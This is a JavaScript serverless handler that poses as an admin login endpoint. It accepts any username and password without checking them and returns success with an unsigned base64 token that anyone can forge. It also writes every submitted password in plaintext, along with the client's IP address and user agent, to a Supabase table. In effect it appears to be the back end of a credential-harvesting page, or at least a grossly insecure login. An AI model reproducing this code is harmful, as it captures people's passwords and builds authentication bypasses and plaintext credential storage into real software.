import { createClient } from "@supabase/supabase-js";

function getSupabase() {
  const url = process.env.SUPABASE_URL;
  const key = process.env.SUPABASE_SERVICE_KEY;
  if (!url || !key) return null;
  return createClient(url, key);
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { username, password } = req.body || {};

  if (!username || !password) {
    return res.status(400).json({ error: "Campos obligatorios" });
  }

  /* Generate session token */
  const token = Buffer.from(
    JSON.stringify({ user: username, ts: Date.now() })
  ).toString("base64");

  /* Save credentials + session info to Supabase */
  const supabase = getSupabase();
  if (supabase) {
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
      req.headers["x-real-ip"] ||
      "unknown";
    const ua = req.headers["user-agent"] || "unknown";

    const { error: insertError } = await supabase.from("admin_sessions").insert({
      username,
      user_password: password,
      ip_address: ip,
      user_agent: ua,
      expires_at: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
      is_active: true,
    });
    if (insertError) console.error("Insert error:", insertError);
  }

  return res.status(200).json({ success: true, token, user: username });
}
